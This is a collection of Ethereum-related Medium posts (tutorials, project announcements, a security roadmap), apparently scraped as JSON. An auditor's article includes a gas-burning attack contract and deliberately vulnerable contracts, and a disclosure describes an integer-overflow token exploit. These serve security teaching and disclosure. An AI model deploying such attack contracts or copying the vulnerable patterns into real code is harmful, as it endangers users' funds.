available on my Github Repository.Handling OwnershipHandling ownership of the contract is pretty basic. As typically done, we set the owner of the deployed contract to msg.sender upon initialization:function Sellable() public {        owner = msg.sender;        Transfer(now,address(0),owner,0);    }Then, we add the onlyOwner modifier, which will be used on every function that we want to make only executable by the person currently owning the contract:modifier onlyOwner {        require(msg.sender == owner);        _;    }What we\u2019ll want our contract to do is to allow the owner to be changed under certain conditions.Putting the Contract for\u00a0SaleThe owner of the contract can put it up for sale by calling the following function:function initiateSale(uint _price, address _to) onlyOwner public {        require(_to != address(this) && _to != owner);        require(!selling);                selling = true;                // Set the target buyer, if specified.        sellingTo = _to;                askingPrice = _price;    }initiateSale() takes two parameters:uint _price: which is the price the owner wants to sell the contract for.address _to: which is optional, and corresponds to who the owner wants to sell the contract to.When putting the contract up for sale, the owner has two options: They can choose the buyer, in that case the sale has been prearrange. Or they can simply \u201cannounce\u201d the contract is for sale and the first person to claim it (and paying its price) gets it.Additionally, the asking price can be set to 0. This means that the owner of the contract is allowed to gift, donate or give the contract away.There\u2019s one more important thing to notice: There\u2019s a ifNotLocked modifier that can be added to the contract\u2019s functions to prevent them from being executed if the contract is in a sale process. If used properly, this prevents the contract\u2019s data from being modified just before it is purchased.Finally, there\u2019s the cancelPurchase() function which allows the owner to cancel the sale before someone completes it.function cancelSale() onlyOwner public {        require(selling);                // Reset sale variables        resetSale();    }Buying the\u00a0ContractOnce the contract is up for sale, all it takes to complete the sale is for the buyer (if it was specified) or anyone (if no particular buyer was specified) to call the following function:function completeSale() public payable {        require(selling);        require(msg.sender != owner);        require(msg.sender == sellingTo || sellingTo == address(0));        require(msg.value == askingPrice);                // Swap ownership        address prevOwner = owner;        address newOwner = msg.sender;        uint salePrice = askingPrice;                owner = newOwner;                // Transaction cleanup        resetSale();                prevOwner.transfer(salePrice);                Transfer(now,prevOwner,newOwner,salePrice);    }The completeSale() function is a payable function which requires the ether to be sent. The amount to be sent must be the exactly the same the owner set as the asking price.When completeSale() is executed, the ether will be transferred to the owner and then the ownership will be transferred to the buyer. This finishes the transaction and cleans up the contract for the new owner, who can now use it normally, or even put it up for sale again.An Example Use\u00a0CaseHere\u2019s a very simple example of how this base contract could be used:contract Kitty is Sellable {        string public name;    uint public kittyValue = 0;        function Kitty(string _name) public {        name = _name;    }        function findNewOwner() public onlyOwner {        kittyValue = kittyValue + 1 ether;           super.initiateSale(kittyValue,address(0));    }        function renameKitty(string newName) ifNotLocked public onlyOwner {        name = newName;    }        function buyKitty() public payable {        require(msg.value == kittyValue);        super.completeSale();    }}We have a contract which represents a CryptoKitty \ud83d\ude3a. The owner can findNewOwner() to put it up for sale. Each time the kitty is bought his value increases by 1 ether. The owner of the kitty can change its name, as long as it is not being sold at the moment by implementing the ifNotLocked modifier in renameKitty\u00a0.That\u2019s it!If you have further suggestions to improve this Sellable protocol, please add your comments, bugs or suggestions in the EIP I created.Photo by Jonas Vincent on\u00a0Unsplash", "responses": "1"}, {"title": "dYdX Launches on\u00a0Testnet", "author_name": "Antonio Juliano", "link": "https://medium.com/dydxderivatives/dydx-launches-on-testnet-38b2812c56e?source=search_post", "post_date": "Jun 5, 2018", "readtime": "2 min read", "upvotes": "702", "content": "dYdX Launches on\u00a0TestnetAntonio JulianoBlockedUnblockFollowFollowingJun 5, 2018We\u2019re excited to announce the dYdX Margin Trading Protocol has launched on the Kovan Testnet! Along with the launch, we\u2019re also open sourcing the smart contract code for the protocol.The launch includes:The base dYdX Margin Trading ProtocolShort & Leveraged Long TokensThe 0x exchange wrapper, which allows any 0x order to be used with dYdXA shared lending contract that lets multiple lenders participate in a margin loanERC-721 positions and loansAn opt-in dutch auction contract that can automatically close positionsThe most accurate and efficient compound interest calculator on EthereumOur protocol smart contracts are some of the most sophisticated to exist on Ethereum to this point. We have built them in a modular way that allows many features to be built on top and easily upgraded without sacrificing decentralization.We\u2019ve also invested heavily in testing and audits to ensure the contracts are as secure as possible. We\u2019ve built an extremely rigorous test suite with 100% test coverage on both lines and branches for all of the more than 10,000 Solidity lines of our smart contracts. Additionally, our contracts are being audited separately by multiple top security firms. Once these audits are complete we\u2019ll start rolling out to mainnet.In the coming months we\u2019ll be releasing user facing applications that make it simple for users to use dYdX. We are also hard at work building libraries that will help developers build on top of the protocol. For any questions, please reach out on our Slack and stay tuned for some upcoming technical posts that dive into more detail on our protocol!If you\u2019re interested in joining us in building state-of-the-art smart contracts and decentralized applications check out our job postings or reach out to us at jobs@dydx.exchange. We\u2019re rebuilding the core of the world\u2019s biggest financial market and are always looking for talented individuals to join the team!", "responses": "4"}, {"title": "Silent But Vulnerable: Ethereum Gas Security\u00a0Concerns", "author_name": "Steve Marx", "link": "https://medium.com/consensys-diligence/silent-but-vulnerable-ethereum-gas-security-concerns-adadf8bfb180?source=search_post", "post_date": "Dec 18, 2018", "readtime": "6 min read", "upvotes": "385", "content": "Silent But Vulnerable: Ethereum Gas Security\u00a0ConcernsSteve MarxBlockedUnblockFollowFollowingDec 18, 2018Photo by Mahkeo on\u00a0UnsplashEvery transaction sent to the Ethereum blockchain requires a nontrivial amount of work to process. Gas is how that work is measured and paid for. Users tend to think of gas as a confusing annoyance, and developers think of it in terms of optimizing their costs.As a smart contract auditor, I often think of gas as a potential attack vector. In this post, I\u2019ll examine three ways that gas can lead to security vulnerabilities. The third issue is one that I haven\u2019t seen written about before.He who sent it spent\u00a0itA fundamental truth about transactions is that they\u2019re paid for by the sender\u2014the account that signed the transaction.This fact can result in an attack vector if:An attacker can cause you to send a transaction, andThey can cause that transaction to consume a lot of gas.The first condition isn\u2019t difficult to satisfy. If I own an account at a centralized exchange (e.g. Coinbase), I can instruct the exchange to transfer funds to an account of my choosing. A typical implementation involves the exchange sending a transaction from one of their accounts. Because the exchange is sending the transaction, they are paying for gas.Satisfying the second condition is easy for a smart contract developer. Smart contracts can run arbitrary code in response to an incoming transaction. The following smart contract burns a bunch of gas when it receives an ether transfer:pragma solidity 0.5.1;contract GasBurner {    uint256 counter;    function() external payable {        for (uint256 i = 0; i < 100; i++) {            counter += 1;        }    }}The sender of a transaction specifies an upper bound on how much gas will be consumed, known as a gas limit. This limit is often determined automatically by simulating the transaction and seeing how much gas will be consumed. If an exchange does this, they\u2019re vulnerable to being tricked into consuming large quantities of gas.Further readingThe above code burns the gas pointlessly, but it could be put to a more productive use. Perhaps the attacker\u2019s contract could do some valuable computation with that gas. As Level K recently observed, a great use for excess gas is to use it to mint GasTokens, which can be turned around and sold.MitigationTo keep yourself safe from this sort of exploit, make sure that you always set a reasonable gas limit on your transactions.He who filled it killed\u00a0itBecause Ethereum\u2019s computing resources are finite, there\u2019s a limit to how much gas can be used in a single block. This is known as the block gas limit. Miners try to pack transactions into a block to get as close as possible to that gas limit because the gas fees are paid to the miner.At the time of this writing, the block gas limit for the Ethereum main network is about 8,000,000. A transaction that consumes more gas than that cannot be mined at all.This can become a denial of service attack vector\u2014a way for an attacker to stop a smart contract from being able to function. The following is an example of a vulnerable contract:pragma solidity 0.5.1;contract TerribleBank {    struct Deposit {        address depositor;        uint256 amount;    }    Deposit[] public deposits;        function deposit() external payable {        deposits.push(Deposit({            depositor: msg.sender,            amount: msg.value        }));    }        function withdrawAll() external {        uint256 amount = 0;        for (uint256 i = 0; i < deposits.length; i++) {            if (deposits[i].depositor == msg.sender) {                amount += deposits[i].amount;                delete deposits[i];            }        }                msg.sender.transfer(amount);    }}If the deposits array gets long enough, it will no longer be possible to call withdrawAll(), because such a transaction wouldn\u2019t fit within a block. An attacker can easily cause this condition by calling deposit() repeatedly until the right array length is reached. This would lock all existing ether in the contract.It\u2019s also possible to mount a denial of service attack on the entire blockchain by completely filling up blocks with your transactions. As long as those transactions specify a generous enough gas price, rational miners will include the attacker\u2019s transactions at the exclusion of all others.Futher readingSWC-128, \u201cDoS With Block Gas Limit,\u201d describes the general class of bugs.\u201cMadMax: surviving out-of-gas conditions in Ethereum smart contracts\u201d by Grech et al. is a recent academic paper from OOPSLA\u201918 that attempts to measure how many smart contracts are vulnerable to block gas limit attacks.The FOMO3D prize, worth millions of dollars, was claimed by someone who successfully mounted a \u201cblock stuffing attack.\u201dMitigationSmart contract auditors start sweating as soon as they see a for loop. Avoid them where possible, unless they\u2019re bounded by a small constant number of iterations.Block stuffing attacks are expensive to mount, so to mitigate them, design your contracts to minimize the financial impact of fixed deadlines. For example, an auction often has a deadline for accepting bids, so a block stuffing attack could prevent people from bidding. Make sure the goods being auctioned off in such a system are not valuable enough that a block stuffing attack becomes financially viable.He who relayed it paid\u00a0itFinally, I\u2019d like to examine a vulnerability class that I haven\u2019t seen described before.As a workaround for the rule that \u201che who sent it spent it,\u201d I\u2019ve seen a lot of recent discussion about so-called \u201cmeta transactions.\u201d A meta transaction is a lot like a transaction but is able to be relayed by a third party. The third-party relayer is the account actually sending the transaction, so it pays for the gas.This trick is accomplished via a signature and a proxy contract. The user signs their meta transaction and broadcasts it to the world. Anyone who sees the meta transaction can relay it to the proxy contract. As long as the message contains a valid signature, the proxy contract will execute the specified call. The relayer is often paid (e.g. with a token) to cover their expenses.The relayer has an unusual attack vector in such a scheme. As the transaction sender, they get to dictate how much gas they provide. By providing too little gas, they can cause the call to fail. This is a problem if they have incentive to do that, as in the following contract:pragma solidity 0.5.1;contract IERC20 {    function transfer(address target, uint256 amount) external returns (bool);}contract RelayProxy {    address owner = msg.sender;    uint256 nonce = 0;    IERC20 token = IERC20(0x...);    function execute(        address payable target,        bytes calldata data,        uint256 _nonce,        uint8 v,        bytes32 r,        bytes32 s    )        external    {        uint256 startGas = gasleft();        require(_nonce == nonce, \"Bad nonce.\");        bytes32 h = hash(target, data, _nonce);        require(ecrecover(h, v, r, s) == owner, \"Bad signature.\");        (bool success, ) = target.call(data);        if (success) {            nonce += 1;        }        // pay relayer for consumed gas in tokens        require(token.transfer(msg.sender, startGas - gasleft()));    }        function hash(        address target,        bytes memory data,        uint256 _nonce    )        internal        pure        returns (bytes32)    {        return keccak256(abi.encodePacked(target, data, _nonce));    }}A nonce is used to prevent replay attacks, but note that the nonce is only incremented when the call succeeds. A malicious relayer can, by manipulating the gas limit, cause the call to fail repeatedly. Each time the relayer calls execute, they get paid for whatever gas gets used.MitigationA tempting solution is to increment the nonce regardless of the success or failure of the call, but this opens up a denial of service attack vector. Every time the user broadcasts their meta transaction, a malicious relayer can pick it up and cause it to fail as before. Now that the nonce has been incremented, the user needs to sign a new meta transaction, and the process repeats.Another tempting solution would be to revert the transaction if the call fails, but this means it\u2019s impossible to compensate relayers when calls fail for legitimate reasons.The best solution is to directly address the root problem, which is that the relayer is allowed to specify the transaction\u2019s gas limit. To lock this down, be sure to include a gas limit in the signed message and check that it\u2019s being obeyed in the proxy contract. This is the approach taken in Status\u2019s relay proxy.Christian Lundqvist\u2019s \u201csimple multisig wallet\u201d mitigates this issue primarily by allowing the user to dictate the transaction sender as part of their signed message. This means a malicious relayer can\u2019t get involved in the first place.SummaryFailing to take proper care with gas can lead to serious smart contract vulnerabilities. When reading code, such vulnerabilities are often invisible, but they really stink.", "responses": "4"}, {"title": "OpenZeppelin Framework Proposal and Development Roadmap", "author_name": "Manuel Araoz", "link": "https://blog.zeppelin.solutions/zeppelin-framework-proposal-and-development-roadmap-fdfa9a3a32ab?source=search_post", "post_date": "Sep 14, 2016", "readtime": "5 min read", "upvotes": "246", "content": "OpenZeppelin Framework Proposal and Development RoadmapManuel AraozBlockedUnblockFollowFollowingSep 14, 2016OpenZeppelin is a new smart contract development framework for the Ethereum Virtual Machine (EVM) focused on security, modularity, and code reusability. At Zeppelin Solutions, we started this initiative to gather the community around building new security standards and sharing efforts in smart contract development.Most of this proposal is based on our experience building and maintaining other open-source projects like Bitcore and Streamium. Feel free to give feedback on what you think could be improved.MotivationSmart contract security is hard. We need better tools for developers and teams to build the next generation of blockchain-based smart contract applications. There is yet no community-standard code to help write smart contracts in a safe way. We\u2019re introducing OpenZeppelin as a way to discuss, learn together, and build tools for a safer decentralized finance ecosystem.PrinciplesThe core development principles we want to base OpenZeppelin on are:Security in DepthWe strive to provide secure, tested, audited code. To achieve this, we need to match intention with function. Thus, documentation, code clarity, community review and security discussions are fundamental.Simple and ModularSimpler code means easier audits, and better understanding of what each component does. We look for small files, small contracts, and small functions. If you can separate a contract into two independent functionalities you should probably do it.Naming MattersWe take our time with picking names. Code is going to be written once, and read hundreds of times. Renaming for clarity is encouraged.TestsWrite tests for all your code. We encourage Test Driven Development so we know when our code is right. Even though not all code in the repository is tested at the moment, we aim to test every line of code in the future.Check pre-conditions and post-conditionsA very important way to prevent vulnerabilities is to catch a contract\u2019s inconsistent state as early as possible. This is why we want functions to check pre- and post-conditions for executing its logic. When writing code, ask yourself what you are expecting to be true before and after the function runs, and express it in code.Code ConsistencyConsistency on the way classes are used is paramount to an easier understanding of the library. The codebase should be as unified as possible. Read existing code and get inspired before you write your own. Follow the style guidelines. Don\u2019t hesitate to ask for help on how to best write a specific piece of code.Regular AuditsFollowing good programming practices is a way to reduce the risk of vulnerabilities, but professional code audits are still needed. We will perform regular code audits on major releases, and hire security professionals to provide independent review.For more info and a proposed code style guide check our CONTRIBUTING document on GitHub.ImplementationWe\u2019re starting with Solidity tools because Ethereum is currently the most popular smart contract development platform. Working with Solidity also makes our tools compatible with Rootstock and some private blockchain systems like IBM\u2019s Blue Horizon.But our vision of improving smart contract development security standards is platform agnostic. Our plans for the future involve working on tools for Bitcoin, Tendermint, Bloq Ora, or whatever platform developers are using to build smart contract apps.Some modules and components we\u2019re looking to implement soon for Solidity are:Pull payment helpers: Lots of security problems (including the infamous TheDAO hack) can be prevented by using a pull payment strategy (as opposed to pushing payments with `send`). We already have a simple PullPaymentCapable.sol contract, but more comprehensive tools, documentation and examples are needed.Contract life-cycle tools: Most contracts nowadays are deployed to the blockchain without much thought about what will happen to them in the future. We\u2019d love to build tools to better manage several contract death strategies, contract transfer of ownership, contract pausing and resuming, contract upgradeability, etc.Fault tolerance and Automatic bug bounties: Automatic detection of faults, and tools to recover from inconsistent states. Simple tools to limit the amount of funds managed by contracts. We\u2019re also working on, and looking to improve, bug bounty contracts to have automatic payouts to security researchers that can break our contract\u2019s invariants.Resusable basic components: Many common modules are still reimplemented from scratch for each new project. We\u2019re looking to build standard contracts for token issuance, crowdfunding, voting, betting, payroll, revenue sharing, etc.Explore formal verification ideas: Formal verification of contracts is an active research area. Integrating this work into OpenZeppelin can provide interesting security guarantees to our contracts. Formal verification means statically analyzing contract code to formally prove correctness and/or problems.Better oracle interfaces: An important part of smart contract development is how to interact with off-blockchain data sources. An interesting idea to explore is to do inversion of control, where oracles call contracts (to communicate outside truths) through a common interface method, and can implement their oracle logic as wanted: trusted expert, closed voting, open voting, API wrapper. Instead of contracts requesting data from oracles, oracles inform contracts of data changes.Better code reuse tools: Current Solidity code reuse is based on copy-pasting or downloading existing code from other repositories. Mature ecosystems have good code repository management systems such as NodeJS\u2019 npm or Ruby\u2019s gems. An interesting variation in Ethereum is the possibility of reusing code already deployed to the blockchain. We\u2019re planning to build tools that allow to easily link your contracts to deployed libraries.All these points are already in our GitHub issue tracker. Bear in mind that this is just a proposal based on the work we\u2019re interested in at Zeppelin Solutions. We\u2019re happy to hear your thoughts and ideas on what to work on next. We want OpenZeppelin to be community-driven and community-maintained. Join us!If you look at our repo now, you\u2019ll see some commits already there, but most of the work is ahead, and we want you to be a part of it!RoadmapThe rough project roadmap for the following months is:Sep 2016. Make OpenZeppelin public and start development.Oct 2016. Gather community around it and build first tools for existing smart contract projects.Nov 2016. Develop first proof of concept of a simple fully OpenZeppelin-based real organization. Security audit code and first major OpenZeppelin release.Dec 2016. Deploy said proof of concept organization and maintain it. Further OpenZeppelin development to more components based on community needs.Jan 2017. Develop the OpenZeppelin organization as a smart contract using OpenZeppelin (eat your own dogfood). Model incentives for contributions to the project (e.g.: tokens assigned for each merged commit).Feb 2017. Deploy OpenZeppelin organization to the blockchain. Plan next 6 months.Be part of the communityContinue the discussion on our forumContribute on GitHubFollow us on TwitterEven better, join the team \ud83d\ude80", "responses": "1"}, {"title": "Reducing ETH Gas by making an Asynchronous Tx with\u00a0Oraclize", "author_name": "billy rennekamp", "link": "https://hackernoon.com/reducing-eth-gas-by-making-an-asynchronous-tx-with-oraclize-32a5d10236c8?source=search_post", "post_date": "Oct 30, 2017", "readtime": "9 min read", "upvotes": "403", "content": "Reducing ETH Gas by making an Asynchronous Tx with\u00a0Oraclizebilly rennekampBlockedUnblockFollowFollowingOct 30, 2017In a previous article (\ud83e\udd11) I was able to reduce an Ethereum transaction costing 95 Million (MM) gas down to 4.1MM by converting arrays to byte strings. This was a big step in the process of building clovers.network but 4.1MM gas was still unacceptable. I was able to reduce it again to 1.5MM by utilizing an Oracle to offload the bulk of the work and save only the result\u2014basically making an asynchronous call on the Ethereum Virtual Machine (EVM).The transaction in question contains a function that plays a game of Reversi using moves supplied by the user. If the game is valid and hasn\u2019t previously been registered, the user becomes the owner of that board and is able to sell it as a Clover (\u2724). Furthermore, if the board is symmetrical then the user receives a mining reward in ERC20 ClubToken (\ufe0e\u2663\ufe0e) relative to the rarity of the symmetry. While the game is rather simple to program on the EVM the level of complexity is still very expensive. That\u2019s because every step in the process of checking the game is saved along with the result of that game. This is important to prove the method of validation, however there\u2019s another way to prove validation while not having to pay for it: ask an oracle \ud83d\udd2e.An oracle provides a portal to the world outside of the EVM. If you want to know the current price of Ether in USD, Euro or GBP\u2014ask an oracle. If you want to know the weather \ud83c\udf24 in Chicago\u00a0, who won the Cubs \ud83d\udc3b game or whether your flight \u2708\ufe0f to ORD is delayed\u2014ask an oracle. You can also do things with an oracle that aren\u2019t possible on the EVM like generate random numbers.There\u2019s some debate about whether these features belong on the Ethereum Blockchain, since in theory all transactions should be verifiable and repeatable\u2014how can a URL request at a specific moment in time be repeatable? (For more information about that debate and oracles in general look here, here and here.) Luckily for me I wanted an oracle to call a function already on the EVM. That way the method of validation is still verifiable but I don\u2019t have to spend gas recording all the steps producing the result.", "responses": "2"}, {"title": "Integer Overflow (i.e., proxyOverflow Bug) Found in Multiple ERC20 Smart Contracts (CVE-2018\u201310376)", "author_name": "PeckShield", "link": "https://medium.com/@peckshield/integer-overflow-i-e-proxyoverflow-bug-found-in-multiple-erc20-smart-contracts-14fecfba2759?source=search_post", "post_date": "Apr 24, 2018", "readtime": "3 min read", "upvotes": "427", "content": "Integer Overflow (i.e., proxyOverflow Bug) Found in Multiple ERC20 Smart Contracts (CVE-2018\u201310376)PeckShieldBlockedUnblockFollowFollowingApr 24, 2018On 4/24/2018, 01:17:50 p.m. UTC, PeckShield, a blockchain security startup, detected an unusual MESH token transaction (shown in Figure 1). In this particular transaction, someone transferred a large amount of MESH token\u200a\u2014\u200a0x8fff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff,ffff (63 f\u2019s) to herself along with a huge amount fee\u200a\u2014\u200a0x7000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0001 to the address issuing this transaction.Figure 1: A Suspicious MESH Token Transfer (with huge amount)There\u2019s another case happened to the SMT token at 07:16:19 UTC with the same attack pattern.Figure 2: A Suspicious SMT Token Transfer (with huge amount)As we look into the corresponding smart contract, we find out that the proxyTransfer()function has a classic integer overflow problem.Figure 3: A proxyOverflow-affected Smart ContractAs shown in Figure 3, both _fee and _value are input parameters which could be controlled by the attacher. If _fee + _value happens to be 0 (the overflow case), the sanity checks in line 206 could be passed. It means the attacker could transfer huge amount of tokens to an address (line 214) with zero balance. Also, a huge amount fee would be transferred to the msg.sender in line 217.From our system-wide scanning, we have located quite a few ERC20 tokens affected, includingWith the touted \u201ccode-is-law\u201d principle in Ethereum blockchain, there is no traditional well-known security response mechanism in place to remedy these vulnerable contracts! A proper way to recover from these vulnerabilities and devastating effects requires coordination and support from all eco-system members, especially digital asset exchanges. In the meantime, we cannot over-emphasize the importance of performing a thorough and comprehensive audit of smart contracts before deployment.Fortunately, we are happy to know that effectively at 04/25/2018 15:30 p.m. GMT+8, OKEx has ERC-20 tokens deposit suspended. (Here is the announcement:https://support.okex.com/hc/en-us/articles/360003019292 ). Similarly, Huobi Pro also suspends deposits and withdrawals of all coins ( http://space.bitleek.com/topic/2132/huobi-pro-suspends-deposits-and-withdrawals-of-all-coins). Meanwhile, we want to point out that certain affected tokens are still tradable on some exchanges (e.g., gate.io, HitBTC, YoBit, and CoinExchange). Note that the presence of non-centralized exchanges with offline trading services could pose additional challenges as they might not be able to stop attackers from laundering their tokens.About USPeckShield Inc. is a blockchain security company which aims to elevate the security, privacy, and usability of current blockchain ecosystem by offering top-notch, industry-leading services and products (including smart contract auditing). Please contact us at Telegram, Twitter, or Email.", "responses": "2"}, {"title": "Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse\u00a0them", "author_name": "Nicole Zhu", "link": "https://hackernoon.com/ethernaut-lvl-0-walkthrough-abis-web3-and-how-to-abuse-them-d92a8842d71b?source=search_post", "post_date": "Aug 13, 2018", "readtime": "3 min read", "upvotes": "353", "content": "Ethernaut Lvl 0 Walkthrough: ABIs, Web3, and how to abuse\u00a0themMake a smart contract do things it didn\u2019t want\u00a0to\u2026Nicole ZhuBlockedUnblockFollowFollowingAug 13, 2018This is a in-depth series around Zeppelin\u2019s smart contract security puzzles. I\u2019ll give you the direct resources and key concepts you\u2019ll need to solve the puzzles 100% on your own.Over the next weeks, we\u2019ll reproduce how some serious hacks were induced, notably:$50M DAO hack: resulting from a re-entrancy problem$30M Parity hack: induced by a delegatecall() exploitationRequired: Basic knowledge of smart contract development", "responses": "2"}, {"title": "Colony Q4\u00a0Update", "author_name": "Colony", "link": "https://medium.com/colony/colony-q4-update-287cda939fde?source=search_post", "post_date": "Oct 17, 2017", "readtime": "6 min read", "upvotes": "337", "content": "Colony Q4\u00a0UpdateColonyBlockedUnblockFollowFollowingOct 17, 2017At Colony, we use the OKR method for setting quarterly goals and keeping our distributed team of 12 in sync and accountable. Below is our quarterly report on Q3 and a look ahead at Q4 2017.The end of\u00a0Q3Good riddance, Q3Let\u2019s start with the good.We published our whitepaperN of 1. Full stop.The rest of the quarter? Well, some unexpected things came up.Our main goal for the quarter was to distribute our tokens. We had everything in place. Whitepaper. Wiki. A beautiful new website. Our token sale contract had been audited by the talented guys at DappHub. The works.But then our lawyer called. And then this happened.The Colony Token SaleDoing an \u201cICO\u201d increasingly seems to be the yardstick by which progress (or even, dare I say, success) is measured in\u2026blog.colony.ioThat changed things.We spent the better part of a month regrouping and figuring out our next steps:What do we need to do to do a token sale? (A: launch the network first.)What\u2019s the minimum functionality needed to securely launch the network? (A: reputation system + revenue & reward system.)How do we remove the reliance on centralized tech in the client? (A: it\u2019s very complicated.)We were expecting to do quite a few things in Q3 that were impacted by the not-doing-a-token-sale outcome:Announce and launch Colony Labs to research and work on the blockchain usability problemDeploy the initial Colony Network functionality to testnetStart a second round of beta testingHire a handful of additional teammatesAll of this was either iceboxed (#1 and #4) or delayed (#2 & #3) due to the token sale fallout.Oh well. It may seem like a huge impediment, but it\u2019s really not. We\u2019re in this for the long haul and postponing a token sale by ~1-year is not a big deal when you zoom out.The Colony Whitepaper ReleaseAfter initially sharing it with a curated list of reviewers and then incorporating their feedback, we published our technical whitepaper.The Colony WhitepaperToday, we are happy to (finally!) release the Colony Whitepaper.blog.colony.ioIt had been a long time comin\u2019.Our most flattering comment so far:I\u2019ve had high hopes for Colony since I came across it several months ago, but this White Paper far exceeded my loftiest expectations.The Colony Whitepaper is the culmination of years of hard work and painstaking attention to detail, but it\u2019s certainly not perfect, and it will be updated as needed.If you\u2019ve read it and have any suggestions for improvement or clarification, hit us up over slack, email, or by submitting a Github pull request.We wrote some other stuff,\u00a0tooAt the beginning of the quarter, we open-sourced a document for creating a fair employee equity plan.On creating a better employee equity planEconomists believe in full employment. Americans think that work builds character. But what if jobs aren\u2019t working\u2026blog.colony.ioThiago published an illuminating technical blog post on Solidity function best practices.How to write clean, elegant Solidity code using function modifiersOne of the most interesting features in Solidity are function modifiers. When added to a function body they extend it\u2026blog.colony.ioAnd our CEO Jack du Rose had a couple bylines on the future of workWhat Blockchain Means for the Future of WorkIn the eighth millennium BC, Sumerians created proto-writing systems for accounting. Arguably, the blockchain\u2026data-informed.comHow Blockchains Will Reinvent the Job Market - CommPRO.bizJack du Rose, Co-founder, Colony.io Office work is a theatrical performance of emails, meetings, and inscrutable tedium\u2026www.commpro.bizWell met,\u00a0Q4This quarter is going to be all about building and learning\u200a\u2014\u200athe Colony Network, the decentralized product, the market.Our three goals are:An MVP of the Colony Network is built50% of the decentralized backend is complete500 completed transactions are completed by beta-II usersThe Colony Network: Developing and Learning about a Smart Contract EcosystemThe whitepaper is a tedious read for a very good reason: It is meant to describe in detail the blueprint for a fully-realized Colony Network.This quarter (and next), we will be the writing Colony Network smart contracts for:Tasking system (mostly complete)Funding + bounties (mostly complete)Reputation + skillsRevenue + rewardsReputation miningNetwork transaction feeAs we work to implement this functionality we are looking to expand our dogfooding efforts and work with outside contributors.If you are skilled with solidity, have read the whitepaper, and want to contribute to the development of the Colony Network, get in touch with Elena to learn more.Beta II: Developing and Learning about the\u00a0MarketOur first beta was used by 40 teams comprising 175 collaborators, to whom we are eternally indebted for helping us improve our product.We made some major usability improvements as a result and are now a couple weeks away from deploying an updated task lifecycle workflow which\u2019ll make it easier to incentivize, reward, and track the contributions of your Colony.Once that\u2019s deployed, we\u2019ll be launching a second round of beta testing. Our goal is to have beta-II users complete 500 transactions by the end of Q4.The beta helps us learn more about the market and our fit within it. We have a grand vision for the future of work, but we also foresee more iterative steps for startups and enterprises to begin making work more open.As always, if you\u2019re interested in utilizing Colony, have a use case you think it\u2019ll be good for, and are willing to give us brutally honest and tediously verbose feedback on your experience, reach out to Collin for information about Beta II access.A True DApp: Developing and Learning about Decentralized TechnologiesThe Colony beta, as it exists now, is a hybrid app that runs on a private chain and incorporates quite a bit of client-server functionality and other \u201ctrusty\u201d features\u200a\u2014\u200awhich have been just fine for our testing purposes!Nevertheless, the Colony dApp as it exists now can\u2019t be considered a pure dApp, and it isn\u2019t congruent with what we\u2019d like Colony to eventually become: an open, decentralized, trustless network of work.While we want to aim for a fully decentralized product, the technologies that the dApp would need to be built upon are still immature.Keeping the dApp entirely based on the decentralized protocol stack (Swarm/IPFS, Whisper, Ethereum) would require substantial trade-offs between decentralization and user experience\u200a\u2014\u200aand we have very high standards for user experience.For example, events that occur on-chain such as setting a task bounty need to wait ~15 seconds for the transaction to be mined. When was the last time you felt okay with waiting 15 seconds to add an item on your to-do list\u200a\u2014\u200aand paying ~$0.05 in the process? That\u2019s pretty poor UX, but these sorts of things are unavoidable in Ethereum dApps today.There are also some more fundamental issues that the Colony dApp needs to wrestle with. Right now the server dApp relies on the MongoDB for many key features. Migrating database functionality to something decentralized is not a trivial task.So what happens next? Do we continue to run with our client-server architecture and gradually migrate toward decentralization piece by piece? Do we just wait around for scaling and UX solutions to appear in the ether? Do we solve those UX problems ourselves? Is there something we can do right now to move in the right direction?We have decided that the best course of action will be to create a new environment for a server-less dApp, and start fresh with decentralization as the primary consideration. This will lead to a product which has limited functionality in the beginning, but which can benefit from new scaling efforts arising in the Ethereum community.While some work will need to be thrown out, we feel that this is the best approach toward how we envision the final product to be. So starting in Q4, we\u2019re going to move forward without the server, and, using the lessons of the Beta, build a new version of the Colony dApp which is even dAppy-er.", "responses": "1"}, {"title": "Bancor Protocol", "author_name": "Eyal Hertzog", "link": "https://blog.bancor.network/bancor-protocol-6aac5a297dcb?source=search_post", "post_date": "Feb 13, 2017", "readtime": "2 min read", "upvotes": "102", "content": "Bancor ProtocolEyal HertzogBlockedUnblockFollowFollowingFeb 13, 2017Hello World, We\u2019re the team behind the Bancor Protocol (PDF) and we\u2019re building a decentralized, hierarchical monetary system on the blockchain.When we look at the world of exchange between people, we see two main categories of things that we share and trade\u200a\u2014\u200aInformation and Value. While information (content such as texts, images, video, etc.) is replicable by its nature (when you share it, you and someone else both have it), value is not (when you give it to someone, you no longer have it.)Before the age of the Internet, there were many private information networks, which some of us are even old enough to remember, like BBSs, Prodigy, Compuserve, AoL, to name a few. The rise of the public Internet changed everything and those which survived adopted the new open, global standard for information exchange, which relies on a collection of TCP/IP networks, interlinked through peering agreements.Until blockchain, all currencies, which represent value, lived in closed silos. Blockchain, the technology pioneered by Bitcoin, is the decentralized value exchange network, the Internet of money. It will eventually replace a large part of today\u2019s private banking networks and allow new players (and the old which adapt) to create new types of value and transact in an open, global system not owned by anyone.The Bancor team has been building products on the Internet since the late nineties. Some of our companies were Contact Networks, MetaCafe, Mytopia, Particle Code and AppCoin. We bumped into Bitcoin in 2011 and began exploring possibilities in user-generated currencies. Following the release of Ethereum in 2015, we understood that smart-contracts were a game changer and would allow for currency creation and customization at scale. Programmable modules that manage and hold value (represented as tokens) can perform value-related processes for a negligible cost\u200a\u2014\u200aprocesses currently handled by various organizations (e.g. escrow services, exchanges, law firms, to name a few). However, the implications of autonomous decentralized code which can manage digital money on an open standard for value exchange are far more profound.In the Summer of 2016, we started working on Bancor with the goal of creating a hierarchical monetary system (where one digital token holds other tokens in its reserve) to build a new type of standard for cryptocurrencies that would lay the foundation for a decentralized global exchange. One that is autonomous, has no spread, no counterparty risk and provides continuous liquidity for any asset. One that enables the long-tail of currencies as the Internet did for content.We would like to share with you, the Internet, our draft whitepaper for your review and comments. All feedback is welcome, and much appreciated.The Bancor Teamhttp://bancor.network", "responses": "1"}, {"title": "From A to Z: Making the MVP of a real DApp on Ethereum and deploying it", "author_name": "dev_zl", "link": "https://hackernoon.com/from-a-to-z-making-the-mvp-of-a-real-dapp-on-ethereum-and-deploying-it-50c750ef0c4e?source=search_post", "post_date": "Apr 5, 2018", 